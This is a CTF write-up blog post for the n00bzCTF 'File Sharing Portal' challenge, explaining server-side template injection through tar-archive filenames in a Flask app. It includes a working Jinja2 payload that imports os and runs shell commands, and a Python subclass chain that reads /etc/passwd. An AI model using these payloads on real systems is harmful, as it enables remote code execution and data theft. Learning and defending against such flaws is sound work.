<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>n00bzCTF - File Sharing Portal | hxuu</title><meta name=keywords content="ctf,write-up,n00bzCTF"><meta name=description content="CTF write-up for File Sharing Portal"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/n00bz24/file-sharing-portal/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.e44f33264f033f576c3ce7f772762cc751d91ddb02aaa170e312a8aff988c2e6.css integrity="sha256-5E8zJk8DP1dsPOf3cnYsx1HZHdsCqqFw4xKor/mIwuY=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/n00bz24/file-sharing-portal/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/n00bz24/file-sharing-portal/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="n00bzCTF - File Sharing Portal"><meta property="og:description" content="CTF write-up for File Sharing Portal"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2024-08-09T09:40:00+01:00"><meta property="article:modified_time" content="2024-08-09T09:40:00+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="N00bzCTF"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="n00bzCTF - File Sharing Portal"><meta name=twitter:description content="CTF write-up for File Sharing Portal"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"n00bzCTF - File Sharing Portal","item":"https://hxuu.github.io/blog/ctf/n00bz24/file-sharing-portal/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"n00bzCTF - File Sharing Portal","name":"n00bzCTF - File Sharing Portal","description":"CTF write-up for File Sharing Portal","keywords":["ctf","write-up","n00bzCTF"],"articleBody":"Challenge Description name: file sharing portal category: web exploitation points: 478 author: NoobMaster + NoobHacker Welcome to the file sharing portal! We only support tar files!\nSolution We are presented with the following interface\nAs well as the source code of the application.\n#!/usr/bin/env python3 from flask import Flask, request, redirect, render_template, render_template_string import tarfile from hashlib import sha256 import os app = Flask(__name__) @app.route('/',methods=['GET','POST']) def main(): global username if request.method == 'GET': return render_template('index.html') elif request.method == 'POST': file = request.files['file'] if file.filename[-4:] != '.tar': return render_template_string(\" We only support tar files as of right now!\n\") name = sha256(os.urandom(16)).digest().hex() os.makedirs(f\"./uploads/{name}\", exist_ok=True) file.save(f\"./uploads/{name}/{name}.tar\") try: tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar') tar_file.extractall(path=f'./uploads/{name}/') return render_template_string(f\"Tar file extracted! View here\") except: return render_template_string(\"Failed to extract file!\n\") @app.route('/view/') def view(name): if not all([i in \"abcdef1234567890\" for i in name]): return render_template_string(\"Error!\n\") #print(os.popen(f'ls ./uploads/{name}').read()) #print(name) files = os.listdir(f\"./uploads/{name}\") out = 'Files\n' files.remove(f'{name}.tar') # Remove the tar file from the list for i in files: out += f'","wordCount":"1244","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-08-09T09:40:00+01:00","dateModified":"2024-08-09T09:40:00+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/n00bz24/file-sharing-portal/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;
<svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">n00bzCTF - File Sharing Portal</h1><div class=post-description>CTF write-up for File Sharing Portal</div><div class=post-meta><span title='2024-08-09 09:40:00 +0100 CET'>August 9, 2024</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/n00bz24/file-sharing-portal.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-description>Challenge Description</a></li><li><a href=#solution>Solution</a><ul><li><a href=#explanation>Explanation:</a></li><li><a href=#summary>Summary:</a></li><li><a href=#notes>Notes</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-description>Challenge Description<a hidden class=anchor aria-hidden=true href=#challenge-description>#</a></h2><pre tabindex=0><code>name: file sharing portal
category: web exploitation
points: 478
author: NoobMaster + NoobHacker
</code></pre><p>Welcome to the file sharing portal! We only support tar files!</p><h2 id=solution>Solution<a hidden class=anchor aria-hidden=true href=#solution>#</a></h2><p>We are presented with the following interface</p><p><img alt=welcome loading=lazy src=/blog/images/2024-08-09-15-08-57.png></p><p>As well as the source code of the application.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>redirect</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>render_template_string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>tarfile</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha256</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span><span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>username</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;GET&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span><span class=p>[</span><span class=o>-</span><span class=mi>4</span><span class=p>:]</span> <span class=o>!=</span> <span class=s1>&#39;.tar&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s2>&#34;&lt;p&gt; We only support tar files as of right now!&lt;/p&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>name</span> <span class=o>=</span> <span class=n>sha256</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;./uploads/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;./uploads/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2>/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2>.tar&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tar_file</span> <span class=o>=</span> <span class=n>tarfile</span><span class=o>.</span><span class=n>TarFile</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;./uploads/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>.tar&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>tar_file</span><span class=o>.</span><span class=n>extractall</span><span class=p>(</span><span class=n>path</span><span class=o>=</span><span class=sa>f</span><span class=s1>&#39;./uploads/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&lt;p&gt;Tar file extracted! View &lt;a href=&#39;/view/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2>&#39;&gt;here&lt;/a&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s2>&#34;&lt;p&gt;Failed to extract file!&lt;/p&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/view/&lt;name&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>view</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=nb>all</span><span class=p>([</span><span class=n>i</span> <span class=ow>in</span> <span class=s2>&#34;abcdef1234567890&#34;</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>name</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s2>&#34;&lt;p&gt;Error!&lt;/p&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1>#print(os.popen(f&#39;ls ./uploads/{name}&#39;).read())</span>
</span></span><span class=line><span class=cl>            <span class=c1>#print(name)</span>
</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;./uploads/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=s1>&#39;&lt;h1&gt;Files&lt;/h1&gt;&lt;br&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>files</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>.tar&#39;</span><span class=p>)</span>  <span class=c1># Remove the tar file from the list</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;&lt;a href=&#34;/read/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>/</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#34;&gt;</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&lt;/a&gt;&#39;</span>
</span></span><span class=line><span class=cl>       <span class=c1># except:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/read/&lt;name&gt;/&lt;file&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=n>file</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=ow>not</span> <span class=nb>all</span><span class=p>([</span><span class=n>i</span> <span class=ow>in</span> <span class=s2>&#34;abcdef1234567890&#34;</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>name</span><span class=p>])):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s2>&#34;&lt;p&gt;Error!&lt;/p&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=s2>&#34;..&#34;</span> <span class=ow>in</span> <span class=n>name</span><span class=p>)</span> <span class=ow>or</span> <span class=p>(</span><span class=s2>&#34;..&#34;</span> <span class=ow>in</span> <span class=n>file</span><span class=p>))</span> <span class=ow>or</span> <span class=p>((</span><span class=s2>&#34;/&#34;</span> <span class=ow>in</span> <span class=n>file</span><span class=p>)</span> <span class=ow>or</span> <span class=s2>&#34;/&#34;</span> <span class=ow>in</span> <span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=s2>&#34;&lt;p&gt;Error!&lt;/p&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;./uploads/</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>/</span><span class=si>{</span><span class=n>file</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>1337</span><span class=p>)</span>
</span></span></code></pre></div><ol><li>The application has a file upload feature which only accepts <code>tar</code> archives.</li><li>the tar archive is given a random <code>name</code>, saved in <code>uploads/{name}</code>. Its contents are extracted in the same path.</li><li>when viewed using <code>/view/{name}</code> endpoint, the tar archive is deleted and the listing of files is shown.</li></ol><p>What&rsquo;s interesting in the latter step is that the names of the uploaded files are passed directly,
without sanitization into the <code>render_template_string</code> function by flask, which builds an html reponse
<strong>server side</strong> using jinja2 as a templating engine.</p><blockquote><p>&ldquo;I didn&rsquo;t talk about the /read endpoint because it&rsquo;s irrelavant in this writeup.
but other writeups (linked at the end) make use of this endpoint&rdquo;</p></blockquote><blockquote><p>from the documentation of Flask: &ldquo;Flask leverages Jinja2 as its template engine.&rdquo;</p></blockquote><blockquote><p>A Jinja template is simply a text file. Jinja can generate any text-based format (HTML, XML, CSV, LaTeX, etc.).</p></blockquote><p>Simply put, our filenames are taken straight from us and injected into the template. If
our injection is malicious, we can get remote code execution and read the flag.</p><hr><p>But&mldr;</p><p>We have two problems at hand.</p><ol><li><p>how can we execute python code inside the jinja2 template?</p></li><li><p>we don&rsquo;t know the flag name (as shown in the Dockerfile)</p></li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>FROM python:3.9-slim
</span></span><span class=line><span class=cl>RUN apt-get update <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    apt-get install -y cron <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    apt-get clean <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    rm -rf /var/lib/apt/lists/*
</span></span><span class=line><span class=cl>WORKDIR /app
</span></span><span class=line><span class=cl>COPY requirements.txt server.py /app/
</span></span><span class=line><span class=cl>COPY templates/ /app/templates/
</span></span><span class=line><span class=cl>COPY uploads/ /app/uploads/
</span></span><span class=line><span class=cl>COPY REDACTED.txt /app/
</span></span><span class=line><span class=cl><span class=c1># The flag file is redacted on purpose</span>
</span></span><span class=line><span class=cl>RUN pip install --no-cache-dir -r requirements.txt
</span></span><span class=line><span class=cl><span class=c1># Add the cron job to the crontab</span>
</span></span><span class=line><span class=cl>RUN mkdir /etc/cron.custom
</span></span><span class=line><span class=cl>RUN <span class=nb>echo</span> <span class=s2>&#34;*/5 * * * * root rm -rf /app/uploads/*&#34;</span> &gt; /etc/cron.custom/cleanup-cron
</span></span><span class=line><span class=cl>RUN <span class=nb>echo</span> <span class=s2>&#34;* * * * * root cd / &amp;&amp; run-parts --report /etc/cron.custom&#34;</span> <span class=p>|</span> tee -a /etc/crontab
</span></span><span class=line><span class=cl><span class=c1># Give execution rights on the cron job</span>
</span></span><span class=line><span class=cl>RUN chmod +x /etc/cron.custom/cleanup-cron
</span></span><span class=line><span class=cl>RUN crontab /etc/cron.custom/cleanup-cron
</span></span><span class=line><span class=cl>RUN crontab /etc/crontab
</span></span><span class=line><span class=cl>CMD <span class=o>[</span><span class=s2>&#34;sh&#34;</span>, <span class=s2>&#34;-c&#34;</span>, <span class=s2>&#34;cron &amp;&amp; python server.py&#34;</span><span class=o>]</span>
</span></span></code></pre></div><hr><p>Taking a step back, A template contains variables and/or expressions, which get replaced with values when a template is rendered;
we can test this out by archiving a file called <code>{{5*5}}</code> and viewing it in the <code>/view</code> endpoint</p><p>Here is how we can go about doing so.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>touch <span class=s2>&#34;{{5*5}}&#34;</span>
</span></span><span class=line><span class=cl>tar -cvf proof-of-concept.tar <span class=s2>&#34;{{5*5}}&#34;</span>
</span></span></code></pre></div><p>After the upload, we can see that the website indeed rendered 25 instead of <code>{{5*5}}</code></p><p><img alt=proof-of-concept loading=lazy src=/blog/images/2024-08-09-15-34-25.png></p><p>Nice, we have confirmed that we have a SSTI, next is finding a way to run python code inside the template.
But not any code&mldr; Code that will enable us to find the name of the flag, and eventually read it.</p><p>For that, let me introduce some internals of python.</p><p>So in python, everything is an object, that means we can do something like</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>type</span><span class=p>(</span><span class=s1>&#39;hxuu&#39;</span><span class=p>))</span>
</span></span></code></pre></div><p>and we get <code>&lt;class 'str'></code>, that is, the string &lsquo;hxuu&rsquo; is an instance of the str class.
In the same way variables are objects, functions too are objects. Now check this out.</p><p>In normal day to day programming, when we want to read a file using python,
we would use something like this</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/etc/passwd&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span></code></pre></div><p>which opens the <code>/etc/passwd</code> file and reads its content. We can achieve the same thing, but start with a string
instead, how so?</p><p>Since everything is an object, meaning everything in python inherents from the object class.
we can climb the inheretence tree to reach all the subclasses available, select the one we
want to use to execute a shell command, and boom, command executed. Like this:</p><pre tabindex=0><code>&#39;&#39;.__class__.__base__.__subclasses__()[&lt;index-of-_io._IOBase&gt;].__subclasses__()[&lt;index-of-_io._RawIOBase&gt;].__subclasses__()[&lt;index-of-_io.FileIO&gt;](&#39;/etc/passwd&#39;).read()
</code></pre><p>I know this is a very roundabout way of going about things, but we&rsquo;ll need it in our challenge,
because Flask by default passes certain variables to the jinja2 template by default, mainly:</p><p><img alt=defaults loading=lazy src=/blog/images/2024-08-09-16-01-49.png></p><p>We can use either one of those, but the easiest is the <code>request</code> object, from which
we can access the application context, through which we can import the &lsquo;os&rsquo; module, and get RCE!</p><p>Let&rsquo;s build our payload then:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{{</span><span class=n>request</span><span class=o>.</span><span class=n>application</span><span class=o>.</span><span class=vm>__globals__</span><span class=o>.</span><span class=n>__builtins__</span><span class=o>.</span><span class=n>__import__</span><span class=p>(</span><span class=s1>&#39;os&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;&lt;our-command&gt;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()}}</span>
</span></span></code></pre></div><h3 id=explanation>Explanation:<a hidden class=anchor aria-hidden=true href=#explanation>#</a></h3><ol><li><p><strong><code>request.application</code></strong>: This accesses the <code>application</code> object associated with the current <code>request</code> in a web framework context. It often represents the main application object or a similar structure in web frameworks.</p></li><li><p><strong><code>__globals__</code></strong>: This attribute is a dictionary containing the global variables available in the scope where <code>application</code> is defined. It allows you to access global context or variables directly.</p></li><li><p><strong><code>__builtins__</code></strong>: This is a reference to the built-in module in Python that contains all built-in functions and exceptions. It&rsquo;s accessible globally and is often used to get access to core Python functions.</p></li><li><p><strong><code>__import__('os')</code></strong>: This dynamically imports the <code>os</code> module using Python’s <code>__import__</code> function. The <code>os</code> module provides a way to interact with the operating system, including executing shell commands.</p></li><li><p><strong><code>popen('&lt;our-command>')</code></strong>: The <code>popen</code> method from the <code>os</code> module opens a pipe to or from a command. In this case, <code>&lt;our-command></code> should be replaced with the actual shell command you want to execute. <code>popen</code> runs the command and returns a file-like object connected to its standard output.</p></li><li><p><strong><code>.read()</code></strong>: This method reads all the output from the command executed by <code>popen</code>. It collects the command’s output as a string.</p></li></ol><h3 id=summary>Summary:<a hidden class=anchor aria-hidden=true href=#summary>#</a></h3><p>This code snippet is used to execute a shell command from within a web template or application context and display its output. It does this by accessing global variables and built-in functions from the web application&rsquo;s context, dynamically importing the <code>os</code> module, and using <code>popen</code> to run a command, finally reading and rendering the command&rsquo;s output.</p><p>Perfect! let&rsquo;s test this out with the <code>id</code> command. Here is the result:</p><p><img alt=id-command-ran loading=lazy src=/blog/images/2024-08-09-16-52-47.png></p><p>We are root! we got remote code execution, rest is to find the flag. This can be done by listing the directory
contents using a simple <code>ls</code></p><p><img alt=ls loading=lazy src=/blog/images/2024-08-09-16-54-18.png></p><p>noice~ the flag name is:</p><pre tabindex=0><code>flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt
</code></pre><p>Change the command once again to</p><pre tabindex=0><code>cat flag_15b726a24e04cc6413cb15b9d91e548948dac073b85c33f82495b10e9efe2c6e.txt
</code></pre><p><img alt=flag loading=lazy src=/blog/images/2024-08-09-16-55-38.png></p><p>And there we go~ The flag is: <code>n00bz{n3v3r_7rus71ng_t4r_4g41n!_f593b51385da}</code></p><hr><h3 id=notes>Notes<a hidden class=anchor aria-hidden=true href=#notes>#</a></h3><p>This was a particularly interesting challenge, and my solution was not the intended solution haha.
I know I overcomplicated things a lot, but hey, those pyjails I love playing paid a lot.</p><ul><li>We learned about server side template injection, and some tricks with python.</li></ul><p>If you&rsquo;re interested in other ways to solve the challenge, you can experiment with symbolic links,
cron jobs OR&mldr; a misuse of the archiving function in the python code. Hope you learned something, take care!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/n00bzctf/>N00bzCTF</a></li></ul><nav class=paginav><a class=prev href=https://hxuu.github.io/blog/ctf/lit24/anti-inspect/><span class=title>« Prev</span><br><span>LITCTF24 - Anti Inspect</span>
